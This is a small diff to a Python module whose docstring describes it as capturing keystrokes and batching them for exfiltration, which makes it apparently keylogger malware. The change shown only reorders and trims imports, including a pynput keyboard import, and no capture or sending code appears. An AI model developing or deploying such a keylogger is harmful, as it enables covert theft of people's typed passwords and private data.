@@ -4,9 +4,8 @@ Captures keystrokes and batches them for exfiltration.
 """
 
 import threading
-import time
-from datetime import datetime
 from collections import deque
+from datetime import datetime
 
 try:
     from pynput import keyboard
